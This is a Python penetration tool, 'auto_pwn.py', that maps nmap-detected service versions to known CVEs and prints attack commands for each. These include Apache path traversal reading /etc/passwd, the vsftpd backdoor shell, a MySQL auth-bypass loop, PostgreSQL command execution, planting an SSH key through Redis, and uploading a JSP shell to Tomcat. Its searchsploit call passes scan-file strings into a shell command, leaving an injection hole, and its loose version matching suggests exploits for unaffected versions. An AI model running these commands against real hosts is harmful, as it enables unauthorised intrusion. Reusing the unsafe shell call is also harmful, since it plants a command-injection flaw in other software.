```python
#!/usr/bin/env python3
"""
auto_pwn.py - Version to exploit mapper
Usage: python3 auto_pwn.py -t 10.10.10.5 --nmap scan.xml
"""

import argparse
import subprocess
import json
import xml.etree.ElementTree as ET

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[1m'
X = '\033[0m'

EXPLOIT_DB = {
    "apache": {
        "2.4.49": ["CVE-2021-41773", "Path Traversal/RCE", "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'"],
        "2.4.50": ["CVE-2021-42013", "Path Traversal/RCE", "curl 'http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'"]
    },
    "nginx": {
        "1.20": ["CVE-2021-23017", "Request Smuggling", "Send crafted HTTP request"]
    },
    "openssh": {
        "7.2": ["CVE-2016-6210", "Username Enumeration", "python3 ssh-user-enum.py target"],
        "7.7": ["CVE-2018-15473", "Username Enumeration", "python3 ssh-user-enum.py target"]
    },
    "samba": {
        "3.0.24": ["CVE-2007-2447", "RCE", "python3 usermap_script.py target"],
        "4.5.12": ["CVE-2017-7494", "SambaCry RCE", "python3 sambacry.py -t target"]
    },
    "vsftpd": {
        "2.3.4": ["CVE-2011-2523", "Backdoor", "nc target 6200"]
    },
    "proftpd": {
        "1.3.3c": ["CVE-2010-4221", "RCE", "python3 proftpd_exploit.py target"]
    },
    "mysql": {
        "5.0": ["CVE-2012-2122", "Auth Bypass", "for i in $(seq 1 1000); do mysql -u root --password=x -h target; done"]
    },
    "postgresql": {
        "9.3": ["CVE-2019-9193", "RCE", "COPY cmd_exec FROM PROGRAM 'id';"]
    },
    "redis": {
        "4.0": ["Unauthenticated RCE", "Write SSH key", "redis-cli -h target\nCONFIG SET dir /root/.ssh/\nSET x 'pubkey'\nSAVE"]
    },
    "tomcat": {
        "7.0": ["CVE-2017-12617", "PUT JSP Upload", "curl -X PUT http://target/shell.jsp/ --data @shell.jsp"]
    },
    "jenkins": {
        "2.235": ["CVE-2020-2103", "RCE", "python3 jenkins_rce.py target"]
    }
}

def parse_nmap(xml_file):
    services = []
    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()
        
        for host in root.findall('host'):
            for port in host.findall('.//port'):
                service = port.find('service')
                if service is not None:
                    name = service.get('name', 'unknown')
                    version = service.get('version', '')
                    port_num = port.get('portid')
                    
                    services.append({
                        'port': port_num,
                        'service': name,
                        'version': version,
                        'product': service.get('product', '')
                    })
    except:
        pass
    
    return services

def suggest_exploits(service, version):
    suggestions = []
    
    for svc, versions in EXPLOIT_DB.items():
        if svc.lower() in service.lower():
            for ver, exploit in versions.items():
                if ver in version or version.startswith(ver.split('.')[0]):
                    suggestions.append({
                        'service': service,
                        'version': version,
                        'exploit': exploit[0],
                        'description': exploit[1],
                        'command': exploit[2]
                    })
    
    return suggestions

def searchsploit(service, version):
    try:
        cmd = f"searchsploit -t '{service} {version}' --json 2>/dev/null"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.stdout:
            data = json.loads(result.stdout)
            return data.get('RESULTS', [])
    except:
        pass
    return []

def main():
    ap = argparse.ArgumentParser(description="Auto Exploit Suggester")
    ap.add_argument("-t", "--target", help="Target IP")
    ap.add_argument("--nmap", help="Nmap XML file")
    ap.add_argument("--service", help="Manual service name")
    ap.add_argument("--version", help="Manual version")
    args = ap.parse_args()
    
    print(f"{B}{C}=== AutoPwn - Exploit Suggester ==={X}\n")
    
    services = []
    
    if args.nmap:
        services = parse_nmap(args.nmap)
        print(f"{G}[+] Found {len(services)} services from nmap{X}\n")
    elif args.service and args.version:
        services = [{'service': args.service, 'version': args.version}]
    elif args.target:
        print(f"{Y}[!] Run with --nmap for best results{X}")
        return
    
    all_suggestions = []
    
    for svc in services:
        service_name = svc.get('service', '')
        service_version = svc.get('version', '')
        
        if not service_version:
            continue
        
        print(f"{C}[*] Analyzing {service_name} {service_version}{X}")
        
        suggestions = suggest_exploits(service_name, service_version)
        for s in suggestions:
            print(f"  {R}[!] {s['exploit']}{X}")
            print(f"      {Y}Description:{X} {s['description']}")
            print(f"      {G}Command:{X} {s['command']}\n")
            all_suggestions.append(s)
        
        exploits = searchsploit(service_name, service_version)
        for exploit in exploits[:3]:
            print(f"  {Y}[*] Searchsploit found:{X} {exploit.get('Title', '')}")
            print(f"      {G}Path:{X} {exploit.get('Path', '')}\n")
    
    if not all_suggestions:
        print(f"{Y}[!] No known exploits found for these versions{X}")
        print("Try manual enumeration or check for misconfigurations")
    
    print(f"\n{B}{C}=== EXPLOIT SUMMARY ==={X}")
    for i, s in enumerate(all_suggestions, 1):
        print(f"{i}. {s['service']} {s['version']} -> {s['exploit']}")
        print(f"   Command: {s['command']}\n")

if __name__ == "__main__":
    main()
```